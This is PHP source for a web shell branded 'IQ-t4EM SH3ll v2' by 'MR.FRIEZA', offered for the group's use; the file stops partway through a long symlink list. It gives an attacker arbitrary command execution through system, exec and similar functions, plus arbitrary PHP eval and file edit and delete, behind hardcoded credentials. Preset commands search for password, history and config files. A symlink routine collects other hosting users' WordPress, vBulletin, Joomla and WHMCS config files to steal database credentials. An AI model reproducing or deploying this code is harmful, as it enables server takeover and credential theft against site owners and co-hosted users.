<?
#~IQ-t4EM SH3ll v2
#~BY MR.FRIEZA
/*
I Work Hard In That Sh3ll ^_^!!!
* Thats Sh3ll Is F0r Iq-team Members Only
*/
$me = basename(__FILE__);
error_reporting(0);
$user = 'eso'; 
$pass = 'eso'; 
$uselogin = 1; 

# ---------------------------------------#
#             Authentication             #
#----------------------------------------#
if ($uselogin ==1) {
	if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass)) {
		if($_GET) {$user = $_GET['user'];$pass = $_GET['pass'];}
		if($_POST['usrname']==$user && $_POST['passwrd']==$pass){
			print'<script>document.cookie="user='.$_POST['usrname'].';";document.cookie="pass='.md5($_POST['passwrd']).';";</script>';
		} else {
			if($_POST['usrname']){
				print'<script>alert("Wrong Pass !!");</script>';
			}
?>
<br><br>
<style>
body {
display: block;
margin: 8px;
background: #333;
color: #515258;
font-weight: bolder;
font-size: larger;
}
#loginform{
    margin-top: 150px;
}
.username{
    background-size: #CA6924;
    margin-top: -10px;
    border:1px solid #6C7A89;
    border-radius: 20px;
    height:40px;
    width:300px;
    text-align: center;
      transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;

}
.username:focus{
width:400px;
  transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;
}
.my-username{
    margin-top: -20px;

}
.password{
       background-size: #CA6924;
    border:1px solid #6C7A89;
    border-radius: 20px;
    height:40px;
    width:300px;
    text-align: center;
      transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;
 
}
.password:focus{
width:400px;
  transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;
}
.login{
background-color: #6C7A89;
border:1px solid #264348;
border-radius:20px;
height:30px;
width:90px;
 transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;
}
.login:hover{
background-color: #264348;
border:1px solid #6C7A89;
border-radius::15px;
color:#FFFFFF;
     transition: all 0.5s ease-out 0s;
    transition-property: all;
    transition-duration: 0.4s;
    transition-timing-function: ease-out;
    transition-delay: 0s;
}
.iq-team{
    margin-left:430px;
}
.iq-team span{
    color:#FFF;
    font-size: 10px;
    margin-left: 35px;
    margin-top:-20px;
}
.codeer{
        margin-left:410px;
        margin-top:10px;

}
</style>

		
			</center><br />
         		<div id="loginform" align="center">
				<form method="POST" name="login_form" onSubmit="if(this.usrname.value==''){return false;}">
				<div class="my-username"><input class="username" dir="ltr" name="usrname" id="username" value="" type="text"  size="30" onBlur="Blur('username','userName');" onClick="Clear('username','userName');"/></div><br>
				<div class="my-password"><input class="password" dir="ltr" name="passwrd" id="password" value="" type="password" size="30" onFocus="Focus(2);" /></div><br>
				<div class="my-input-login"><input class="login" type="submit" value=" Login  " name="login" />
</div>
				</form>
			</div>	
            <div class="iq-team">
            <h1>IQ-TEAM </h1>
            <span>www.iq-team.org</span>	</div>
               <div class="codeer">
<span>cOder By://MR.FRIEZA</span>   

            <?php
			exit;
		}
	}
}
if($_POST['logout']) {
	print '<script>document.cookie="user=;";document.cookie="pass=;";</script>';
	print '<script>document.location = "'.$_SERVER['PHP_SELF'].'";</script>';
}

if(isset($_GET['dir'])){
        chdir($_GET['dir']);
       
       
}


$dir = getcwd();

if(strlen($dir)>1 && $dir[1]==":")
$os = "Windows";
else $os = "Linux";
echo'
 <meta http-equiv="content-type" content="text/html; charset=utf-8" />  
 <html></html><head>

 <body>
 
 </body>
 
 </head>
 
 <style>
 body {
background: black;
color: rgb(234, 230, 224);
}
a:-webkit-any-link {
color: rgb(162, 199, 193);
text-decoration: underline;
cursor: auto;
}
a:-webkit-any-link {
color: antiquewhite;
text-decoration: underline;
cursor: auto;
}
 .inputzbut{
	background:white;
	color:#4C83AF;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #4C83AF;
	border-top:1px solid #4C83AF;
}
input {
border: dashed 1px;
border-color: #E4D2D2;
BACKGROUND-COLOR: #CA6924;
font: 9pt Verdana;
color: rgb(235, 232, 232);
}
.output {
margin: auto;
border: 1px solid #4C83AF;
width: 100%;
height: 400px;
background: #white;
padding: 0 2px;
background: rgb(234, 240, 242);
}
.cmdbox{
	width:100%;
}
#menu {
background: #100101;
margin: 8px 2px 4px 2px;
}#menu a {
padding: 4px 18px;
margin: 0;
background: #000000;
text-decoration: none;
letter-spacing: 2px;
}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
td, th {
border-bottom: 1px solid #333333;
padding: 0 8px;
line-height: 24px;

}
td:hover{
border-bottom:1px solid #4C83AF;

}
.IQTEAM {
font-size: 20;
padding: 0;
color: #C3EBD7;
}

.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}

 </style>
 <script>
            function AddAlias(){document.getElementById("cmd").value = document.getElementById("alias").value; }

</script>
';
function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}
function als($os) {
            global $os;
            if($os == 'Windows') {
                    echo "
                    <select name='alias' id='alias' onChange='AddAlias();' >
                    <option value=''>NONE</option> 
                    <option value='dir' >List Directory</option>
                    <option value='dir /s /w /b index.php'>Find index.php in current dir</option>
                    <option value='dir /s /w /b *config*.php'>Find *config*.php in current dir &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;</option>
                    <option value='netstat -an'>Show active connections</option>
                    <option value='net start'>Show running services</option>
                    <option value='tasklist'>Show Pro</option>
                    <option value='net user'>User accounts</option>
                    <option value='net view'>Show computers</option>
                    <option value='arp -a'>ARP Table</option>
                    <option value='ipconfig /all'>IP Configuration</option>
                    <option value='netstat -an'>netstat -an</option>
                    <option value='systeminfo'>System Informations</option>
                    <option value='getmac'>Get Mac Address</option>
                    </select>
                    ";
            }
            else {
                    echo "
                    <select name='alias' id='alias' onChange='AddAlias();' >
                    <option value=''>NONE</option> 
                    <option value='ls -al'>List dir</option>
                    <option value='cat /etc/hosts'>IP Addresses</option>
                    <option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP</option>
                    <option value='lsattr -va'>list file attributes on a Linux second extended file system</option>
                    <option value='netstat -an | grep -i listen'>show opened ports</option>
                    <option value='find / -type f -perm -04000 -ls'>find all suid files</option>
                    <option value='find . -type f -perm -04000 -ls'>find suid files in current dir</option>
                    <option value='find / -type f -perm -02000 -ls'>find all sgid files</option>
                    <option value='find . -type f -perm -02000 -ls'>find sgid files in current dir</option>
                    <option value='find / -type f -name config.inc.php'>find config.inc.php files</option>
                    <option value='find / -type f -name \"config*\"'>find config* files</option>
                    <option value='find . -type f -name \"config*\"'>find config* files in current dir</option>
                    <option value='find / -perm -2 -ls'>find all writable folders and files</option>
                    <option value='find . -perm -2 -ls'>find all writable folders and files in current dir</option>
                    <option value='find / -type f -name service.pwd'>find all service.pwd files</option>
                    <option value='find . -type f -name service.pwd'>find service.pwd files in current dir</option>
                    <option value='find / -type f -name .htpasswd'>find all .htpasswd files</option>
                    <option value='find . -type f -name .htpasswd'>find .htpasswd files in current dir</option>
                    <option value='find / -type f -name .bash_history'>find all .bash_history files</option>
                    <option value='find . -type f -name .bash_history'>find .bash_history files in current dir</option>
                    <option value='find / -type f -name .fetchmailrc'>find all .fetchmailrc files</option>
                    <option value='find . -type f -name .fetchmailrc'>find .fetchmailrc files in current dir</option>
                    <option value='locate httpd.conf'>locate httpd.conf files</option>
                    <option value='locate vhosts.conf'>locate vhosts.conf files</option>
                    <option value='locate proftpd.conf'>locate proftpd.conf files</option>
                    <option value='locate psybnc.conf'>locate psybnc.conf files</option>
                    <option value='locate my.conf'>locate my.conf files</option>
                    <option value='locate admin.php'>locate admin.php files</option>
                    <option value='locate cfg.php'>locate cfg.php files</option>
                    <option value='locate conf.php'>locate conf.php files</option>
                    <option value='locate config.dat'>locate config.dat files</option>
                    <option value='locate config.php'>locate config.php files</option>
                    <option value='locate config.inc'>locate config.inc files</option>
                    <option value='locate config.inc.php'>locate config.inc.php</option>
                    <option value='locate config.default.php'>locate config.default.php files</option>
                    <option value='locate config'>locate config* files </option>
                    <option value='locate \".conf\"'>locate .conf files</option>
                    <option value='locate \".pwd\"'>locate .pwd files</option>
                    <option value='locate \".sql\"'>locate .sql files</option>
                    <option value='locate \".htpasswd\"'>locate .htpasswd files</option>
                    <option value='locate \".bash_history\"'>locate .bash_history files</option>
                    <option value='locate \".mysql_history\"'>locate .mysql_history files</option>
                    <option value='locate \".fetchmailrc\"'>locate .fetchmailrc files</option>
                    <option value='locate backup'>locate backup files</option>
                    <option value='locate dump'>locate dump files</option>
                    <option value='locate priv'>locate priv files</option>
                    </select>
                    ";
            }
    }
    function sys ($frieza)
{
    $funcs = array ('system', 'shell_exec', 'passthru', 'proc_open', 'exec');
    foreach ($funcs as $f)
    {
        if (function_exists ($f))
        {
            echo $f($frieza);
            break;
        }
    }
}
function clearspace($text){
	return str_replace(" ","_",$text);
}

function backbu(){
	
											echo'<br><a href=?dir='.$_GET['dir'].'>[Back]</a>';

	
}

function perms($file){
    $perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
 
    return $info;
}
 
 
 
function size($entry)
{
    $size = filesize($entry);
    $units = array( 'byte', 'k/b', 'm/b', 'g/b', 't/b');
    $power = $size > 0 ? floor(log($size, 1024)) : 0;
    return number_format($size / pow(1024, $power), 2, '.', ',') . ' ' . $units[$power];
}
function fileinfo(){
echo'Filename: '.basename($_GET['file']).'';	
echo'<br>Permission: '.perms($_GET['file']).'';	
echo'<br>Size:: '.size($_GET['file']).'';

echo'<br>action: <a href=?fr=view&file='.realpath($_GET['file']).'&amp;dir='.realpath('.').' >Read</a>  <a href=?fr=edit&file='.realpath($_GET['file']).'&amp;dir='.realpath('.').'>Edit</a> | <a href=?fr=rename&file='.realpath($_GET['file']).'&amp;dir='.realpath('.').'>rename</a> | <a href=?fr=delete&file='.realpath($_GET['file']).'&amp;dir='.realpath('.').'>Delete</a> | <a href=?fr=chmod&file='.realpath($_GET['file']).'&amp;dir='.realpath('.').'>chmod</a>';		
	
	
	
	
}
function evl($eval){
		$eval = str_replace(array("<?php","<?","?>"),"",$eval);
	$eval = eval($eval);
	if($eval){return true;}else{return false;}
			  

}

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
